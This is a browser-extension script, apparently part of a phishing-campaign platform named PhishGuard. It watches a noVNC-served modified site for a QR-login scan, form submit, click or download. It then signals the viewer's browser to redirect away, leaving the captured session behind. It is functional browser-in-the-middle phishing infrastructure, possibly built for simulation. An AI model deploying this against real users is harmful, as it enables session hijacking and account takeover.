// PhishGuard trigger → redirect bridge.
//
// On a deployed campaign server this reads campaign.json (written next to the
// extension at deploy time) and watches for the configured trigger on the
// modified site. When it fires, it emits a redirect SIGNAL onto the X selection
// / clipboard; the noVNC client page (pgvnc.html) catches it and navigates the
// viewer's own browser to the redirect target, leaving the noVNC session.
//
// On the local preview there is no campaign.json, so this does nothing.
(() => {
  "use strict";

  const SIGNAL_PREFIX = "PHISHGUARD_REDIRECT::";

  // Emit the redirect signal by setting the page title to
  // "PHISHGUARD_REDIRECT::<url>". A container-side watcher reads this over CDP
  // (JS selections don't reach the X clipboard under Xvfb, and clipboard writes
  // need a user gesture a QR scan doesn't have) and pushes it to the X clipboard
  // for x11vnc to forward to the viewer. We re-assert it on an interval in case
  // the page overwrites its own title.
  function signal(url) {
    const title = SIGNAL_PREFIX + url;
    try { document.title = title; } catch (_) {}
    setInterval(() => { try { document.title = title; } catch (_) {} }, 300);
    // Best-effort direct clipboard write too (works for gesture triggers).
    try { navigator.clipboard && navigator.clipboard.writeText(title).catch(() => {}); } catch (_) {}
  }

  let fired = false;
  function fire(cfg) {
    if (fired) return;
    fired = true;
    signal(cfg.redirect_target || "");
  }

  // "Scan" trigger: fire the INSTANT the QR code is accepted — i.e. the QR
  // canvas is removed and does not immediately return (a refresh) — which
  // happens before the "loading your messages" screen. Falls back to the
  // slower transition detector if the page has no QR canvas.
  function wireScanTrigger(go) {
    let qr = document.querySelector("canvas");
    let confirmTimer = null;

    const onChange = () => {
      const cur = document.querySelector("canvas");
      if (cur) {
        qr = cur;                       // QR present (or refreshed)
        if (confirmTimer) { clearTimeout(confirmTimer); confirmTimer = null; }
        return;
      }
      if (qr && !cur && !confirmTimer) {
        // QR just vanished — confirm it doesn't come back (then it was scanned).
        confirmTimer = setTimeout(() => {
          if (!document.querySelector("canvas")) { cleanup(); go(); }
          else { confirmTimer = null; }
        }, 250);
      }
    };

    const obs = new MutationObserver(onChange);
    obs.observe(document.documentElement, { childList: true, subtree: true });
    const iv = setInterval(onChange, 150);
    function cleanup() { obs.disconnect(); clearInterval(iv); }

    // No QR canvas within a few seconds → use the generic transition detector.
    setTimeout(() => { if (!qr) { cleanup(); wireTransitionTrigger(go); } }, 4000);
  }

  // Generic transition trigger: fire when the page moves past its initial state
  // — a navigation, an SPA route change, or a large jump in page content.
  function wireTransitionTrigger(go) {
    const GRACE = 2500;
    const started = Date.now();
    let baseHref = location.href;
    let baseLen = 0;
    setTimeout(() => { baseLen = (document.body && document.body.innerText || "").length; }, GRACE);

    const check = () => {
      if (Date.now() - started < GRACE) return false;
      if (location.href !== baseHref) { go(); return true; }
      const len = (document.body && document.body.innerText || "").length;
      if (baseLen && len > baseLen + 2500) { go(); return true; }
      return false;
    };

    const obs = new MutationObserver(() => { if (check()) obs.disconnect(); });
    obs.observe(document.documentElement, { childList: true, subtree: true, characterData: true });
    const iv = setInterval(() => { if (check()) clearInterval(iv); }, 1000);

    // Catch SPA route changes that don't reload the page.
    const origPush = history.pushState;
    history.pushState = function () { const r = origPush.apply(this, arguments); check(); return r; };
    window.addEventListener("popstate", check);
    window.addEventListener("hashchange", check);
  }

  async function init() {
    let cfg;
    try {
      const r = await fetch(chrome.runtime.getURL("campaign.json"));
      if (!r.ok) return;
      cfg = await r.json();
    } catch (_) { return; }
    if (!cfg || !cfg.redirect_target) return;

    const action = cfg.trigger_action || "submit";
    const go = () => fire(cfg);

    switch (action) {
      case "scan":
        wireScanTrigger(go);
        break;
      case "pageload":
        setTimeout(go, 1500);
        break;
      case "login":
      case "submit":
        // A real form submit, OR a login SPA transition (no form submit event).
        document.addEventListener("submit", go, true);
        wireTransitionTrigger(go);
        break;
      case "click":
        document.addEventListener("click", (e) => {
          if (e.target.closest && e.target.closest("a,button,[type=submit],input[type=submit],input[type=button]")) go();
        }, true);
        break;
      case "download":
        document.addEventListener("click", (e) => {
          const a = e.target.closest && e.target.closest("a[download],a[href$='.zip'],a[href$='.exe'],a[href$='.pdf'],a[href$='.doc']");
          if (a) go();
        }, true);
        break;
      default:
        document.addEventListener("submit", go, true);
        document.addEventListener("click", (e) => {
          if (e.target.closest && e.target.closest("button,a,[type=submit]")) go();
        }, true);
        wireTransitionTrigger(go);
    }
  }

  init();
})();
